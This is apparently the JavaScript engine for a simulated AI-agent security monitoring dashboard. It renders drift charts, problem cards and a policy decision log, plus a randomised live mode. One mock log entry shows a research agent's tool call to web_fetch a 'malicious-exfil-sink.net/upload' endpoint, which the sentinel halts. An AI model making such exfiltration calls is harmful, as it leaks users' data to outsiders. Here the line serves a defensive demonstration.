/**
 * SentinelDS Dashboard — Terminal CLI Interactive State Engine
 * 100% Pure Vanilla JS, zero dependencies, responsive vector oscilloscopic plots.
 */

document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements
    const toggleSource = document.getElementById('data-source-toggle');
    const sourceDisplay = document.getElementById('toggle-source-btn');
    const groupScenarios = document.getElementById('scenario-selector-group');
    const btnScenarioA1 = document.getElementById('btn-scenario-a1');
    const btnScenarioA2 = document.getElementById('btn-scenario-a2');
    const btnPlaySim = document.getElementById('btn-play-sim');

    // Overview Panel Elements
    const researchIndicator = document.querySelector('#agent-node-research .process-indicator');
    const researchStatus = document.getElementById('research-status-text');
    const featureIndicator = document.querySelector('#agent-node-feature .process-indicator');
    const featureStatus = document.getElementById('feature-status-text');
    const modelingIndicator = document.querySelector('#agent-node-modeling .process-indicator');
    const modelingStatus = document.getElementById('modeling-status-text');

    const valTraces = document.getElementById('metric-traces-count');
    const valCallRate = document.getElementById('metric-call-rate');
    const valReliability = document.getElementById('metric-uptime');

    // Problems Timeline & Sentinel Logs
    const listProblems = document.getElementById('problems-timeline-list');
    const badgeProblemsCount = document.getElementById('active-problems-badge');
    const tbodyDecisions = document.getElementById('decision-log-tbody');

    // Dataset Drift Charts Elements
    const badgeDriftStatus = document.getElementById('drift-status-badge');
    const chartTitleText = document.querySelector('.panel-drift .pane-header h2');
    const svgGridG = document.getElementById('svg-grid-g');
    const svgLimitsG = document.getElementById('svg-limits-g');
    const svgBaselinePath = document.getElementById('svg-baseline-path');
    const svgActualPath = document.getElementById('svg-actual-path');
    const svgHighlightsG = document.getElementById('svg-highlights-g');
    const svgLegendsG = document.getElementById('svg-legends-g');
    const svgTooltip = document.getElementById('graph-tooltip');
    const svgGraph = document.getElementById('dataset-drift-svg');

    // State Variables
    let currentScenario = 'A1'; // Default Scenario
    let isLiveMode = false;
    let liveTimer = null;
    let liveDataPoints = [];
    let liveBaselinePoints = [];
    let liveDecisions = [];
    let liveProblems = [];
    let liveTraceCount = 142;
    let isSimulationRunning = false;
    let simTimer = null;

    // Chart Dimensions (dynamically read from the SVG element to avoid divergence)
    const svgWidth = svgGraph && svgGraph.viewBox ? (svgGraph.viewBox.baseVal.width || 800) : 800;
    const svgHeight = svgGraph && svgGraph.viewBox ? (svgGraph.viewBox.baseVal.height || 240) : 240;
    const padLeft = 60;
    const padRight = 30;
    const padTop = 35;
    const padBottom = 40;
    const renderWidth = svgWidth - padLeft - padRight;
    const renderHeight = svgHeight - padTop - padBottom;

    // Initialize dashboard
    function init() {
        setupEventListeners();
        renderScenario(currentScenario);
        setupTooltipHover();
    }

    // Bind Event Handlers
    function setupEventListeners() {
        // Toggle Source: Demo vs. Live
        toggleSource.addEventListener('change', (e) => {
            isLiveMode = e.target.checked;
            stopAllTimers();
            
            if (isLiveMode) {
                sourceDisplay.textContent = '[ LIVE STREAM ]';
                sourceDisplay.style.color = 'var(--secondary)';
                groupScenarios.style.opacity = '0.3';
                groupScenarios.style.pointerEvents = 'none';
                btnPlaySim.disabled = true;
                btnPlaySim.style.opacity = '0.3';
                startLiveSimulation();
            } else {
                sourceDisplay.textContent = '[ DEMO DATA ]';
                sourceDisplay.style.color = 'var(--primary)';
                groupScenarios.style.opacity = '1';
                groupScenarios.style.pointerEvents = 'auto';
                btnPlaySim.disabled = false;
                btnPlaySim.style.opacity = '1';
                renderScenario(currentScenario);
            }
        });

        // Scenario A1 Button
        btnScenarioA1.addEventListener('click', () => {
            if (isSimulationRunning || isLiveMode) return;
            setActiveScenario('A1');
        });

        // Scenario A2 Button
        btnScenarioA2.addEventListener('click', () => {
            if (isSimulationRunning || isLiveMode) return;
            setActiveScenario('A2');
        });

        // Play Sim Button
        btnPlaySim.addEventListener('click', () => {
            if (isLiveMode) return;
            if (isSimulationRunning) {
                stopAllTimers();
                isSimulationRunning = false;
                btnPlaySim.textContent = '[ F5: PLAY SIMULATION ]';
                btnPlaySim.classList.remove('sim-running');
                renderScenario(currentScenario);
            } else {
                runTheatricalSimulation();
            }
        });
    }

    function setActiveScenario(scenario) {
        currentScenario = scenario;
        btnScenarioA1.classList.toggle('active', scenario === 'A1');
        btnScenarioA2.classList.toggle('active', scenario === 'A2');
        renderScenario(scenario);
    }

    function stopAllTimers() {
        if (liveTimer) {
            clearInterval(liveTimer);
            liveTimer = null;
        }
        if (simTimer) {
            clearTimeout(simTimer);
            simTimer = null;
        }
        isSimulationRunning = false;
        btnPlaySim.textContent = '[ F5: PLAY SIMULATION ]';
        btnPlaySim.classList.remove('sim-running');
    }

    // =========================================================================
    // PART 1: SCENARIO RENDERING (DEMO MODE)
    // =========================================================================

    function renderScenario(scenarioId) {
        const s = window.SCENARIO_DATA[scenarioId];
        if (!s) return;

        // 1. Text & Headings
        chartTitleText.textContent = `MLSECOPS DRIFT RADAR (${s.driftChart.title.toUpperCase()})`;

        // 2. Metrics Setup
        valTraces.textContent = s.metrics.traces;
        valCallRate.textContent = s.metrics.rate;
        valReliability.textContent = s.metrics.reliability;

        // 3. Agent Topology Update
        updateAgentNode(researchIndicator, researchStatus, s.agents.research);
        updateAgentNode(featureIndicator, featureStatus, s.agents.feature);
        updateAgentNode(modelingIndicator, modelingStatus, s.agents.modeling);

        // 4. Update Problems Feed
        listProblems.innerHTML = '';
        if (s.problems && s.problems.length > 0) {
            badgeProblemsCount.textContent = `[ ${s.problems.length} SECURITY PROBLEM${s.problems.length > 1 ? 'S' : ''} ACTIVE ]`;
            badgeProblemsCount.className = 'pane-badge badge-problem-active';
            s.problems.forEach(p => {
                listProblems.appendChild(createProblemCard(p));
            });
        } else {
            badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
            badgeProblemsCount.className = 'pane-badge';
            listProblems.innerHTML = `
                <div class="timeline-empty-state">
                    <p>>>> NO ANOMALIES REGISTERED IN ACTIVE TELEMETRY WINDOW.</p>
                    <p>>>> SYSTEM INTEGRITY FULLY VERIFIED against Davis AI.</p>
                </div>
            `;
        }

        // 5. Populate Sentinel Log Table
        tbodyDecisions.innerHTML = '';
        s.decisions.forEach(d => {
            tbodyDecisions.appendChild(createDecisionRow(d));
        });

        // 6. Set up and Draw Charts
        drawStaticChart(s.driftChart);

        // 7. Update Drift Status Badge
        updateDriftBadge(s.driftChart.anomalyIndexStart !== undefined);
    }

    // Update Drift Badge state helper to unify live and demo modes
    function updateDriftBadge(isAnomalous, textOverride = null) {
        if (isAnomalous) {
            badgeDriftStatus.textContent = textOverride || (currentScenario === 'A1' ? "[ HIGH EGRESS DETECTED ]" : "[ DATASET DRIFT ALARM ]");
            badgeDriftStatus.className = "pane-badge badge-problem-active";
        } else {
            badgeDriftStatus.textContent = "[ STATS COMPLIANT ]";
            badgeDriftStatus.className = "pane-badge";
        }
    }

    function updateAgentNode(indicatorEl, statusEl, config) {
        indicatorEl.className = 'process-indicator';
        statusEl.className = 'process-status';

        if (config.status === 'healthy') {
            indicatorEl.textContent = '[ OK ]';
            indicatorEl.classList.add('stat-healthy');
            statusEl.textContent = `STATUS: ${config.label.toUpperCase()}`;
        } else if (config.status === 'compromised') {
            indicatorEl.textContent = '[WRN]';
            indicatorEl.classList.add('stat-compromised');
            statusEl.textContent = `STATUS: ${config.label.toUpperCase()}`;
            statusEl.classList.add('compromised');
        } else if (config.status === 'quarantined') {
            indicatorEl.textContent = '[ERR]';
            indicatorEl.classList.add('stat-quarantined');
            statusEl.textContent = `STATUS: ${config.label.toUpperCase()}`;
            statusEl.classList.add('quarantined');
        }
    }

    function createProblemCard(p) {
        const card = document.createElement('div');
        card.className = `syslog-card ${p.severity === 'severe' ? 'prob-severe' : ''}`;
        
        card.innerHTML = `
            <div class="syslog-meta">
                <span>LOG_ID: ${escapeHtml(p.id)}</span>
                <span>TIME_OFFSET: ${escapeHtml(p.timeOffset)}</span>
            </div>
            <div class="syslog-title ${p.severity === 'severe' ? 'severe' : 'warning'}">
                >>> [${escapeHtml(p.severityText.toUpperCase())}] ${escapeHtml(p.title.toUpperCase())}
            </div>
            <div class="syslog-desc">${escapeHtml(p.desc)}</div>
        `;
        return card;
    }

    // Pads strings dynamically to render aligned ASCII columns
    function pad(str, length) {
        str = String(str);
        if (str.length > length) {
            return str.substring(0, length - 3) + "...";
        }
        return str + " ".repeat(length - str.length);
    }

    function createDecisionRow(d) {
        const tr = document.createElement('div');
        tr.className = 'ascii-table-row';
        
        const time = pad(d.time, 8);
        
        let proc = d.agent;
        if (proc === "Research Agent") proc = "RESEARCH_AGENT";
        else if (proc === "Feature Eng. Agent") proc = "FEATURE_ENG";
        else if (proc === "Modelling Agent") proc = "MODEL_AGENT";
        proc = pad(proc, 15);
        
        const tool = pad(d.tool, 25);
        const policy = pad(d.policy, 19);
        
        let verdictClass = "text-verdict-allow";
        if (d.verdict === "WARN") verdictClass = "text-verdict-warn";
        else if (d.verdict === "HALT") verdictClass = "text-verdict-halt";
        
        const verdictStr = pad(`[${d.verdict}]`, 7);
        
        tr.innerHTML = `| <span class="td-timestamp">${escapeHtml(time)}</span> | <span>${escapeHtml(proc)}</span> | <span class="td-tool">${escapeHtml(tool)}</span> | <span class="td-policy">${escapeHtml(policy)}</span> | <span class="${verdictClass}">${escapeHtml(verdictStr)}</span> |`;
        return tr;
    }

    function escapeHtml(str) {
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    }

    // =========================================================================
    // PART 2: STATIC CHART DRAWING (SVG MATH)
    // =========================================================================

    function drawStaticChart(chartData) {
        // Clear previous SVGs dynamic parts
        svgGridG.innerHTML = '';
        svgLimitsG.innerHTML = '';
        svgHighlightsG.innerHTML = '';
        svgLegendsG.innerHTML = '';

        const maxVal = Math.max(...chartData.baseline, ...chartData.telemetry) * 1.25;

        // Draw horizontal grid lines
        const ticks = 4;
        for (let i = 0; i <= ticks; i++) {
            const val = (maxVal * (i / ticks)).toFixed(1);
            const y = padTop + renderHeight - (i / ticks) * renderHeight;
            
            // Grid line
            const line = document.createElementNS("http://www.w3.org/2000/svg", "line");
            line.setAttribute("x1", padLeft);
            line.setAttribute("y1", y);
            line.setAttribute("x2", svgWidth - padRight);
            line.setAttribute("y2", y);
            svgGridG.appendChild(line);

            // Label
            const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
            text.setAttribute("x", padLeft - 10);
            text.setAttribute("y", y + 3);
            text.setAttribute("text-anchor", "end");
            text.textContent = `${val}`;
            svgGridG.appendChild(text);
        }

        // Draw Y Axis Title
        const yTitle = document.createElementNS("http://www.w3.org/2000/svg", "text");
        yTitle.setAttribute("x", 12);
        yTitle.setAttribute("y", padTop - 12);
        yTitle.setAttribute("fill", "var(--muted)");
        yTitle.setAttribute("font-size", "11");
        yTitle.setAttribute("font-family", "VT323");
        yTitle.textContent = chartData.yAxisLabel.toUpperCase();
        svgGridG.appendChild(yTitle);

        // Draw Baseline Limit Line
        const limitY = padTop + renderHeight - (chartData.limitValue / maxVal) * renderHeight;
        const limLine = document.createElementNS("http://www.w3.org/2000/svg", "line");
        limLine.setAttribute("x1", padLeft);
        limLine.setAttribute("y1", limitY);
        limLine.setAttribute("x2", svgWidth - padRight);
        limLine.setAttribute("y2", limitY);
        svgLimitsG.appendChild(limLine);

        const limText = document.createElementNS("http://www.w3.org/2000/svg", "text");
        limText.setAttribute("x", svgWidth - padRight - 5);
        limText.setAttribute("y", limitY - 6);
        limText.setAttribute("text-anchor", "end");
        limText.textContent = `>>> LIMIT: ${chartData.limitLabel.toUpperCase()}`;
        svgLimitsG.appendChild(limText);

        // Draw Anomaly Highlight Shading
        if (chartData.anomalyIndexStart !== undefined) {
            const x1 = padLeft + (chartData.anomalyIndexStart / (chartData.baseline.length - 1)) * renderWidth;
            const x2 = padLeft + (chartData.anomalyIndexEnd / (chartData.baseline.length - 1)) * renderWidth;
            
            const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            rect.setAttribute("x", x1);
            rect.setAttribute("y", padTop);
            rect.setAttribute("width", x2 - x1);
            rect.setAttribute("height", renderHeight);
            rect.setAttribute("class", "anomaly-shading");
            svgHighlightsG.appendChild(rect);

            // Red warning text overlay
            const alertText = document.createElementNS("http://www.w3.org/2000/svg", "text");
            alertText.setAttribute("x", x1 + (x2 - x1)/2);
            alertText.setAttribute("y", padTop + 15);
            alertText.setAttribute("text-anchor", "middle");
            alertText.setAttribute("fill", "var(--error)");
            alertText.setAttribute("font-size", "14");
            alertText.setAttribute("font-weight", "bold");
            alertText.setAttribute("class", "anomaly-shading-text");
            alertText.textContent = "ALARM: CRITICAL ANOMALY ACTIVE";
            svgHighlightsG.appendChild(alertText);
        }

        // Generate Path Commands (Strict vector lines with steps)
        const baselinePathStr = generateSVGPathString(chartData.baseline, maxVal);
        const actualPathStr = generateSVGPathString(chartData.telemetry, maxVal);

        svgBaselinePath.setAttribute("d", baselinePathStr);
        svgActualPath.setAttribute("d", actualPathStr);

        // Set telemetry line color state based on scenario
        svgActualPath.className.baseVal = "graph-path-retro telemetry-path " + 
            (chartData.anomalyIndexStart !== undefined ? "state-danger" : "");

        // Draw Legends
        drawLegendItem(padLeft + 10, svgHeight - 12, "var(--muted)", "HISTORICAL BASELINE", true);
        drawLegendItem(padLeft + 220, svgHeight - 12, 
            chartData.anomalyIndexStart !== undefined ? "var(--error)" : "var(--primary)", 
            "ACTIVE PROCESS TELEMETRY", true);

        // Save active points to elements for hover calculations
        svgGraph.dataset.points = JSON.stringify(chartData.telemetry);
        svgGraph.dataset.baseline = JSON.stringify(chartData.baseline);
        svgGraph.dataset.maxVal = maxVal;
    }

    function generateSVGPathString(dataArray, maxVal) {
        if (!dataArray || dataArray.length === 0) return "";
        let path = "";
        for (let i = 0; i < dataArray.length; i++) {
            const x = padLeft + (i / (dataArray.length - 1)) * renderWidth;
            const y = padTop + renderHeight - (dataArray[i] / maxVal) * renderHeight;
            if (i === 0) path += `M ${x} ${y}`;
            else path += ` L ${x} ${y}`;
        }
        return path;
    }

    function drawLegendItem(x, y, color, labelText, isActive) {
        const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
        g.setAttribute("class", "legends-retro");

        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        rect.setAttribute("x", x);
        rect.setAttribute("y", y - 7);
        rect.setAttribute("width", 12);
        rect.setAttribute("height", 3);
        rect.setAttribute("fill", color);
        g.appendChild(rect);

        const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
        text.setAttribute("x", x + 18);
        text.setAttribute("y", y);
        text.setAttribute("fill", color);
        text.setAttribute("font-size", "14");
        text.textContent = labelText;
        g.appendChild(text);

        svgLegendsG.appendChild(g);
    }

    // =========================================================================
    // PART 3: HOVER INTERACTIVE TOOLTIPS
    // =========================================================================

    function setupTooltipHover() {
        svgGraph.addEventListener('mousemove', (e) => {
            const pointsData = svgGraph.dataset.points;
            if (!pointsData) return;

            const telemetry = JSON.parse(pointsData);
            const baseline = JSON.parse(svgGraph.dataset.baseline);
            const maxVal = parseFloat(svgGraph.dataset.maxVal);
            
            // Get local coordinates inside SVG
            const rect = svgGraph.getBoundingClientRect();
            const mouseX = e.clientX - rect.left;
            
            // Find closest index
            const pct = (mouseX - padLeft) / renderWidth;
            let idx = Math.round(pct * (telemetry.length - 1));
            idx = Math.max(0, Math.min(telemetry.length - 1, idx));

            const valX = padLeft + (idx / (telemetry.length - 1)) * renderWidth;
            const valY = padTop + renderHeight - (telemetry[idx] / maxVal) * renderHeight;

            if (mouseX >= padLeft - 10 && mouseX <= svgWidth - padRight + 10) {
                svgTooltip.setAttribute("opacity", "1");
                svgTooltip.setAttribute("transform", `translate(${valX - 90}, ${Math.max(10, valY - 55)})`);
                
                const texts = svgTooltip.querySelectorAll('text');
                const suffix = currentScenario === 'A1' ? ' KB/S' : ' %';
                
                texts[0].textContent = `>>> TELEMETRY: ${telemetry[idx].toFixed(1)}${suffix}`;
                texts[1].textContent = `>>> BASELINE : ${baseline[idx].toFixed(1)}${suffix}`;
            } else {
                svgTooltip.setAttribute("opacity", "0");
            }
        });

        svgGraph.addEventListener('mouseleave', () => {
            svgTooltip.setAttribute("opacity", "0");
        });
    }

    // =========================================================================
    // PART 4: THEATRICAL SIMULATION (PLAYBACK ENGINE)
    // =========================================================================

    function runTheatricalSimulation() {
        isSimulationRunning = true;
        btnPlaySim.classList.add('sim-running');
        btnPlaySim.textContent = '[ LOADING SYSTEM STATE... ]';

        const s = window.SCENARIO_DATA[currentScenario];
        if (!s) return;

        // Reset Dashboard state to "Pre-Threat / Normal Healthy"
        valTraces.textContent = Math.round(s.metrics.traces * 0.7);
        valCallRate.textContent = "1.1 rps";
        valReliability.textContent = "100.0%";

        updateAgentNode(researchIndicator, researchStatus, { status: "healthy", label: "Active (Healthy)" });
        updateAgentNode(featureIndicator, featureStatus, { status: "healthy", label: "Active (Healthy)" });
        updateAgentNode(modelingIndicator, modelingStatus, { status: "healthy", label: "Active (Healthy)" });

        badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
        badgeProblemsCount.className = 'pane-badge';
        listProblems.innerHTML = `
            <div class="timeline-empty-state">
                <p>>>> INITIATING DETAILED SECURE RECON TELEMETRY TIMELINE FLOW...</p>
            </div>
        `;

        tbodyDecisions.innerHTML = '';
        
        // Show healthy historical decisions
        const healthyDecisions = s.decisions.filter(d => d.verdict === 'ALLOW');
        healthyDecisions.forEach(d => tbodyDecisions.appendChild(createDecisionRow(d)));

        const baselineData = [...s.driftChart.baseline];
        const normalTelemetry = [...s.driftChart.telemetry];
        const anomalyStartIdx = s.driftChart.anomalyIndexStart ?? 10;
        
        const stepTelemetry = normalTelemetry.map((v, i) => i < anomalyStartIdx ? v : baselineData[i] + (Math.random()*2 - 1.0));
        
        const mockChart = {
            ...s.driftChart,
            baseline: baselineData,
            telemetry: stepTelemetry,
            anomalyIndexStart: undefined, // Hide shading
            anomalyIndexEnd: undefined
        };
        
        drawStaticChart(mockChart);
        updateDriftBadge(false);

        // THEATRE TIMELINE SCHEDULE
        // Step 1: Normal logs flowing. Tool-rate normal.
        simTimer = setTimeout(() => {
            btnPlaySim.textContent = '[ RUNNING HEALTHY LOGS... ]';
            valCallRate.textContent = "2.4 rps";
            valTraces.textContent = Math.round(s.metrics.traces * 0.85);
            
            // Step 2: Anomalous event happens! Spike graph line, fire Problem.
            simTimer = setTimeout(() => {
                btnPlaySim.textContent = '[ WARN: SEC INTEGRITY FAULT ]';
                drawStaticChart(s.driftChart); // Re-draw full telemetry with spike & anomaly overlay
                
                updateDriftBadge(true);

                // Push Problem feed!
                badgeProblemsCount.textContent = "[ 1 SECURITY PROBLEM ACTIVE ]";
                badgeProblemsCount.className = 'pane-badge badge-problem-active';
                listProblems.innerHTML = '';
                listProblems.appendChild(createProblemCard(s.problems[s.problems.length - 1]));

                // Update agent statuses to compromised
                if (currentScenario === 'A1') {
                    updateAgentNode(researchIndicator, researchStatus, { status: "compromised", label: "Threat Attempt" });
                } else {
                    updateAgentNode(featureIndicator, featureStatus, { status: "compromised", label: "Label Drift" });
                }

                // Step 3: Sentinel pre-flight intercepts and enforces HALT!
                simTimer = setTimeout(() => {
                    btnPlaySim.textContent = '[ CRIT: SENTINEL INTERCEPT ]';
                    
                    // Inject HALT rows
                    const halts = s.decisions.filter(d => d.verdict === 'HALT' || d.verdict === 'WARN');
                    halts.forEach(h => {
                        tbodyDecisions.insertBefore(createDecisionRow(h), tbodyDecisions.firstChild);
                    });

                    // Quarantines nodes
                    if (currentScenario === 'A1') {
                        updateAgentNode(researchIndicator, researchStatus, { status: "quarantined", label: "Quarantined (HALT)" });
                    } else {
                        updateAgentNode(featureIndicator, featureStatus, { status: "compromised", label: "Label Drift" });
                        updateAgentNode(modelingIndicator, modelingStatus, { status: "quarantined", label: "Quarantined (HALT)" });
                    }

                    // Append rest of problems
                    if (s.problems.length > 1) {
                        badgeProblemsCount.textContent = `[ ${s.problems.length} SECURITY PROBLEMS ACTIVE ]`;
                        listProblems.innerHTML = '';
                        s.problems.forEach(p => listProblems.appendChild(createProblemCard(p)));
                    }

                    valTraces.textContent = s.metrics.traces;
                    valCallRate.textContent = s.metrics.rate;
                    valReliability.textContent = s.metrics.reliability;

                    // Complete Simulation Playback
                    isSimulationRunning = false;
                    btnPlaySim.classList.remove('sim-running');
                    btnPlaySim.textContent = '[ F5: PLAY SIMULATION ]';

                }, 2000);
            }, 1500);
        }, 1500);
    }

    // =========================================================================
    // PART 5: REAL-TIME LIVE DATA STREAMS (LIVE MODE)
    // =========================================================================

    function startLiveSimulation() {
        // Pre-populate historical points for the scrolling grid
        const pointsCount = 20;
        liveBaselinePoints = Array.from({ length: pointsCount }, () => 10 + Math.random() * 5);
        liveDataPoints = [...liveBaselinePoints];
        liveDecisions = [];
        liveProblems = [];

        // Set healthy agent indicators
        updateAgentNode(researchIndicator, researchStatus, { status: "healthy", label: "Active (Healthy)" });
        updateAgentNode(featureIndicator, featureStatus, { status: "healthy", label: "Active (Healthy)" });
        updateAgentNode(modelingIndicator, modelingStatus, { status: "healthy", label: "Active (Healthy)" });

        badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
        badgeProblemsCount.className = 'pane-badge';
        listProblems.innerHTML = `
            <div class="timeline-empty-state">
                <p>>>> ARMED REAL-TIME SOCKET LOG STREAMS IN PORT 8080...</p>
                <p>>>> LISTENING ON DT LOCAL AGENT DAEMONS...</p>
            </div>
        `;

        tbodyDecisions.innerHTML = '';
        chartTitleText.textContent = "LIVE STREAM: INTERACTIVE OBSERVABILITY OSCILLOSCOPE";

        badgeDriftStatus.textContent = "[ STATS COMPLIANT ]";
        badgeDriftStatus.className = "pane-badge";

        // Setup base rendering loop
        tickLiveStream();
        liveTimer = setInterval(tickLiveStream, 1500);
    }

    function tickLiveStream() {
        // 1. Shift line datasets to simulate real-time scroll
        liveBaselinePoints.shift();
        liveBaselinePoints.push(10 + Math.random() * 4);

        liveDataPoints.shift();
        
        const isThreatSpike = Math.random() < 0.15 && liveProblems.length === 0;
        let newPoint = 10 + Math.random() * 5;

        if (isThreatSpike) {
            newPoint = 65 + Math.random() * 45; // Trigger spike
            triggerLiveThreat();
        } else if (liveProblems.length > 0) {
            newPoint = 12 + Math.random() * 6;
        }
        liveDataPoints.push(newPoint);

        // 2. Increment stats counters
        liveTraceCount += Math.floor(Math.random() * 3) + 1;
        valTraces.textContent = liveTraceCount;
        valCallRate.textContent = `${(3.5 + Math.random() * 1.5).toFixed(1)} rps`;
        valReliability.textContent = liveProblems.length > 0 ? "99.82%" : "99.98%";

        // 3. Draw Live charts
        const liveChartConfig = {
            title: "Live Stream: Multi-Agent Workspace Telemetry",
            yAxisLabel: "Scope Amplitude Delta",
            limitValue: 40,
            limitLabel: "Alert Boundary Threshold (40)",
            baseline: liveBaselinePoints,
            telemetry: liveDataPoints,
            anomalyIndexStart: liveProblems.length > 0 ? 18 : undefined,
            anomalyIndexEnd: liveProblems.length > 0 ? 19 : undefined
        };
        drawStaticChart(liveChartConfig);

        // Update drift badge to reflect live-mode problems (aligned with demo behavior)
        updateDriftBadge(liveProblems.length > 0);

        // 4. Decy / resolve existing live problems
        decayLiveProblems();

        // 5. Normal decision logs generated randomly
        if (!isThreatSpike && Math.random() < 0.6) {
            generateLiveAllowDecision();
        }
    }

    function triggerLiveThreat() {
        const timestamp = getFormattedTime();
        
        // Generate mock Dynatrace Problem card
        const newProb = {
            id: `P-LIVE-${Math.floor(100000 + Math.random()*900000)}`,
            title: "SOCKET EGRESS ATTEMPT SHIELDED",
            desc: "Security pre-flight module intercepted an unauthorized payload exfiltration endpoint candidate.",
            severity: "severe",
            severityText: "Severe Risk",
            timeOffset: "Just Now",
            ticksToLive: 4
        };

        liveProblems.unshift(newProb);
        badgeProblemsCount.textContent = "[ 1 SECURITY PROBLEM ACTIVE ]";
        badgeProblemsCount.className = 'pane-badge badge-problem-active';
        listProblems.innerHTML = '';
        listProblems.appendChild(createProblemCard(newProb));

        // Quarantine research agent node
        updateAgentNode(researchIndicator, researchStatus, { status: "quarantined", label: "Quarantined (HALT)" });

        // Add HALT logs
        const newDecision = {
            time: timestamp,
            agent: "Research Agent",
            tool: "web_fetch('https://malicious-exfil-sink.net/upload')",
            policy: "Unrecognized Egress Host",
            verdict: "HALT"
        };
        tbodyDecisions.insertBefore(createDecisionRow(newDecision), tbodyDecisions.firstChild);
    }

    function decayLiveProblems() {
        if (liveProblems.length === 0) return;

        // Decrease ticks to live
        liveProblems.forEach(p => p.ticksToLive--);
        
        const active = liveProblems.filter(p => p.ticksToLive > 0);
        if (active.length !== liveProblems.length) {
            liveProblems = active;
            
            if (liveProblems.length === 0) {
                // All problems resolved!
                updateDriftBadge(false);
                badgeProblemsCount.textContent = '[ SECURE BASELINE ]';
                badgeProblemsCount.className = 'pane-badge';
                listProblems.innerHTML = `
                    <div class="timeline-empty-state">
                        <p>>>> ARMED REAL-TIME SOCKET LOG STREAMS IN PORT 8080...</p>
                        <p>>>> LISTENING ON DT LOCAL AGENT DAEMONS...</p>
                    </div>
                `;
                // Reset nodes to healthy
                updateAgentNode(researchIndicator, researchStatus, { status: "healthy", label: "Active (Healthy)" });
                updateAgentNode(featureIndicator, featureStatus, { status: "healthy", label: "Active (Healthy)" });
                updateAgentNode(modelingIndicator, modelingStatus, { status: "healthy", label: "Active (Healthy)" });
            }
        }
    }

    function generateLiveAllowDecision() {
        const timestamp = getFormattedTime();
        const agents = ["Research Agent", "Feature Eng. Agent", "Modelling Agent"];
        const agent = agents[Math.floor(Math.random() * agents.length)];
        
        let tool = "";
        let policy = "";

        if (agent === "Research Agent") {
            tool = `web_fetch('https://academic-papers.org/study-${Math.floor(10 + Math.random()*90)}')`;
            policy = "Whitelisted Domain";
        } else if (agent === "Feature Eng. Agent") {
            tool = `csv_read('src/data/batch_segment_${Math.floor(1 + Math.random()*5)}.csv')`;
            policy = "Local Read Authorization";
        } else {
            tool = `evaluate_holdout('models/candidate_v${Math.floor(1 + Math.random()*3)}.pkl')`;
            policy = "Model Evaluation Validation";
        }

        const newDecision = {
            time: timestamp,
            agent: agent,
            tool: tool,
            policy: policy,
            verdict: "ALLOW"
        };

        tbodyDecisions.insertBefore(createDecisionRow(newDecision), tbodyDecisions.firstChild);

        // Keep table short, limit rows in UI (max 10 rows inside ASCII wrapper)
        while (tbodyDecisions.children.length > 10) {
            tbodyDecisions.removeChild(tbodyDecisions.lastChild);
        }
    }

    function getFormattedTime() {
        const now = new Date();
        return now.toTimeString().split(' ')[0];
    }

    // Launch Dashboard State Manager
    init();
});
